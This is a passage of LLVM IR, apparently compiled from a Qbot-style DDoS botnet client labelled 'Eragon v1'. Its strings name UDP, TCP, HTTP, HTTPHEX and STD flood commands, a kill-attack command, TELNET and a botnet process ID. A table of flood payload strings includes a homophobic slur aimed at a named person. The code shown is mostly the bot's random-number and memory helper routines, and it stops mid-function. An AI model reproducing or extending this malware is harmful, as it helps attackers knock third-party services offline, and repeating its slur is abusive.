@.str.131 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.132 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.133 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.135 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.136 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.137 = private unnamed_addr constant [12 x i8] c"suckmyFOUND\00", align 1
@.str.138 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.139 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.140 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.142 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.145 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.146 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.147 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.148 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.149 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"kadenthegod\00", align 1
@.str.151 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.152 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.153 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@botnetPid = common local_unnamed_addr global i32 0, align 4
@.str.154 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.155 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.157 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.158 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.160 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.161 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.162 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.163 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.170 = private unnamed_addr constant [37 x i8] c"\1B[96m[%s] \1B[97mConnected -> %s -> %s\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"Eragon v1\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@.str.173 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@GIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32 0) #6
  %2 = icmp eq i32 %1, -1
  %. = select i1 %2, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0)
  ret i8* %.
}

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #3 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #3 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() local_unnamed_addr #1 {
  %1 = tail call i64 @time(i64* null) #6
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = tail call i32 @getpid() #6
  %4 = tail call i32 @getppid() #6
  %5 = xor i32 %4, %3
  store i32 %5, i32* @y, align 4
  %6 = tail call i64 @clock() #6
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @y, align 4
  %9 = xor i32 %8, %7
  store i32 %9, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @clock() local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_next() local_unnamed_addr #3 {
  %1 = load i32, i32* @x, align 4
  %2 = shl i32 %1, 11
  %3 = xor i32 %2, %1
  %4 = lshr i32 %3, 8
  %5 = load i32, i32* @y, align 4
  store i32 %5, i32* @x, align 4
  %6 = load i32, i32* @z, align 4
  store i32 %6, i32* @y, align 4
  %7 = load i32, i32* @w, align 4
  store i32 %7, i32* @z, align 4
  %8 = lshr i32 %7, 19
  %9 = xor i32 %4, %3
  %10 = xor i32 %9, %7
  %11 = xor i32 %10, %8
  store i32 %11, i32* @w, align 4
  ret i32 %11
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %15, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %14, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %8

; <label>:5:                                      ; preds = %.lr.ph
  %6 = tail call i32 @rand_next()
  %7 = bitcast i8* %.01011 to i32*
  store i32 %6, i32* %7, align 4
  br label %.backedge

; <label>:8:                                      ; preds = %.lr.ph
  %9 = icmp sgt i32 %.012, 1
  %10 = tail call i32 @rand_next()
  br i1 %9, label %11, label %.backedge.thread

; <label>:11:                                     ; preds = %8
  %12 = trunc i32 %10 to i16
  %13 = bitcast i8* %.01011 to i16*
  store i16 %12, i16* %13, align 2
  br label %.backedge

.backedge:                                        ; preds = %11, %5
  %.sink14 = phi i64 [ 2, %11 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %11 ], [ -4, %5 ]
  %14 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %15 = add i32 %.012, %.sink
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %8
  %17 = trunc i32 %10 to i8
  store i8 %17, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.018 = phi i8* [ %.0.be, %.backedge ], [ %0, %.lr.ph.preheader ]
  %.01317 = phi i32 [ %32, %.backedge ], [ %1, %.lr.ph.preheader ]
  %4 = icmp ugt i32 %.01317, 3
  %5 = tail call i32 @rand_next()
  br i1 %4, label %.preheader.preheader, label %28

.preheader.preheader:                             ; preds = %.lr.ph
  %6 = lshr i32 %5, 11
  %7 = lshr i32 %5, 3
  %8 = and i32 %7, 31
  %9 = zext i32 %8 to i64
  %10 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %9
  %11 = load i8, i8* %10, align 1
  %12 = getelementptr inbounds i8, i8* %.018, i64 1
  store i8 %11, i8* %.018, align 1
  %13 = lshr i32 %5, 19
  %14 = and i32 %6, 31
  %15 = zext i32 %14 to i64
  %16 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = getelementptr inbounds i8, i8* %.018, i64 2
  store i8 %17, i8* %12, align 1
  %19 = lshr i32 %5, 27
  %20 = and i32 %13, 31
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = getelementptr inbounds i8, i8* %.018, i64 3
  store i8 %23, i8* %18, align 1
  %25 = zext i32 %19 to i64
  %26 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %25
  %27 = load i8, i8* %26, align 1
  store i8 %27, i8* %24, align 1
  %scevgep = getelementptr i8, i8* %.018, i64 4
  br label %.backedge

; <label>:28:                                     ; preds = %.lr.ph
  %29 = trunc i32 %5 to i8
  %30 = and i8 %29, 31
  %31 = getelementptr inbounds i8, i8* %.018, i64 1
  store i8 %30, i8* %.018, align 1
  br label %.backedge

.backedge:                                        ; preds = %.preheader.preheader, %28
  %.sink = phi i32 [ -1, %28 ], [ -4, %.preheader.preheader ]
  %.0.be = phi i8* [ %31, %28 ], [ %scevgep, %.preheader.preheader ]
  %32 = add i32 %.01317, %.sink
  %33 = icmp sgt i32 %32, 0
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #4 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #3 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %6 = zext i32 %5 to i64
  %7 = add nuw nsw i64 %6, 1
  %min.iters.check = icmp ult i64 %7, 32
  br i1 %min.iters.check, label %.lr.ph.preheader19, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.vec = and i64 %7, 8589934560
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader19, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %8 = add i32 %2, -1
  %9 = zext i32 %8 to i64
  %10 = add nuw nsw i64 %9, 1
  %scevgep = getelementptr i8, i8* %0, i64 %10
  %scevgep9 = getelementptr i8, i8* %1, i64 %10
  %bound0 = icmp ugt i8* %scevgep9, %0
  %bound1 = icmp ugt i8* %scevgep, %1
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = getelementptr i8, i8* %1, i64 %n.vec
  %ind.end11 = getelementptr i8, i8* %0, i64 %n.vec
  %cast.crd = trunc i64 %n.vec to i32
  %ind.end13 = sub i32 %2, %cast.crd
  br i1 %memcheck.conflict, label %.lr.ph.preheader19, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %11 = add nsw i64 %n.vec, -32
  %12 = lshr exact i64 %11, 5
  %13 = add nuw nsw i64 %12, 1
  %xtraiter20 = and i64 %13, 3
  %lcmp.mod21 = icmp eq i64 %xtraiter20, 0
  br i1 %lcmp.mod21, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter22 = phi i64 [ %prol.iter22.sub, %vector.body.prol ], [ %xtraiter20, %vector.body.prol.preheader ]
  %next.gep.prol = getelementptr i8, i8* %1, i64 %index.prol
  %next.gep15.prol = getelementptr i8, i8* %0, i64 %index.prol
  %14 = bitcast i8* %next.gep.prol to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %14, align 1, !alias.scope !4
  %15 = getelementptr i8, i8* %next.gep.prol, i64 16
  %16 = bitcast i8* %15 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %16, align 1, !alias.scope !4
  %17 = bitcast i8* %next.gep15.prol to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %17, align 1, !alias.scope !7, !noalias !4
  %18 = getelementptr i8, i8* %next.gep15.prol, i64 16
  %19 = bitcast i8* %18 to <16 x i8>*
  store <16 x i8> %wide.load18.prol, <16 x i8>* %19, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter22.sub = add i64 %prol.iter22, -1
  %prol.iter22.cmp = icmp eq i64 %prol.iter22.sub, 0
  br i1 %prol.iter22.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %20 = icmp ult i64 %11, 96
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %next.gep = getelementptr i8, i8* %1, i64 %index
  %next.gep15 = getelementptr i8, i8* %0, i64 %index
  %21 = bitcast i8* %next.gep to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %21, align 1, !alias.scope !4
  %22 = getelementptr i8, i8* %next.gep, i64 16
  %23 = bitcast i8* %22 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %23, align 1, !alias.scope !4
  %24 = bitcast i8* %next.gep15 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %24, align 1, !alias.scope !7, !noalias !4
  %25 = getelementptr i8, i8* %next.gep15, i64 16
  %26 = bitcast i8* %25 to <16 x i8>*
  store <16 x i8> %wide.load18, <16 x i8>* %26, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %next.gep.1 = getelementptr i8, i8* %1, i64 %index.next
  %next.gep15.1 = getelementptr i8, i8* %0, i64 %index.next
  %27 = bitcast i8* %next.gep.1 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %27, align 1, !alias.scope !4
  %28 = getelementptr i8, i8* %next.gep.1, i64 16
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = bitcast i8* %next.gep15.1 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %30, align 1, !alias.scope !7, !noalias !4
  %31 = getelementptr i8, i8* %next.gep15.1, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %wide.load18.1, <16 x i8>* %32, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %next.gep.2 = getelementptr i8, i8* %1, i64 %index.next.1
  %next.gep15.2 = getelementptr i8, i8* %0, i64 %index.next.1
  %33 = bitcast i8* %next.gep.2 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !4
  %34 = getelementptr i8, i8* %next.gep.2, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load18.2 = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !4
  %36 = bitcast i8* %next.gep15.2 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %36, align 1, !alias.scope !7, !noalias !4
  %37 = getelementptr i8, i8* %next.gep15.2, i64 16
  %38 = bitcast i8* %37 to <16 x i8>*
  store <16 x i8> %wide.load18.2, <16 x i8>* %38, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %next.gep.3 = getelementptr i8, i8* %1, i64 %index.next.2
  %next.gep15.3 = getelementptr i8, i8* %0, i64 %index.next.2
  %39 = bitcast i8* %next.gep.3 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %next.gep.3, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load18.3 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = bitcast i8* %next.gep15.3 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %42, align 1, !alias.scope !7, !noalias !4
  %43 = getelementptr i8, i8* %next.gep15.3, i64 16
  %44 = bitcast i8* %43 to <16 x i8>*
  store <16 x i8> %wide.load18.3, <16 x i8>* %44, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %45 = icmp eq i64 %index.next.3, %n.vec
  br i1 %45, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %7, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %.lr.ph.preheader19

.lr.ph.preheader19:                               ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.lr.ph.preheader
  %.08.ph = phi i8* [ %1, %vector.memcheck ], [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.047.ph = phi i8* [ %0, %vector.memcheck ], [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end11, %middle.block ]
  %.056.ph = phi i32 [ %2, %vector.memcheck ], [ %2, %min.iters.checked ], [ %2, %.lr.ph.preheader ], [ %ind.end13, %middle.block ]
  %46 = add i32 %.056.ph, -1
  %xtraiter = and i32 %.056.ph, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader19
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %48, %.lr.ph.prol ], [ %.08.ph, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %50, %.lr.ph.prol ], [ %.047.ph, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %47, %.lr.ph.prol ], [ %.056.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %47 = add nsw i32 %.056.prol, -1
  %48 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %49 = load i8, i8* %.08.prol, align 1
  %50 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %49, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !12

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader19, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %.08.ph, %.lr.ph.preheader19 ], [ %48, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %.047.ph, %.lr.ph.preheader19 ], [ %50, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %.056.ph, %.lr.ph.preheader19 ], [ %47, %.lr.ph.prol.loopexit.unr-lcssa ]
  %51 = icmp ult i32 %46, 7
  br i1 %51, label %._crit_edge.loopexit, label %.lr.ph.preheader19.new

.lr.ph.preheader19.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader19.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader19.new ], [ %74, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader19.new ], [ %76, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader19.new ], [ %73, %.lr.ph ]
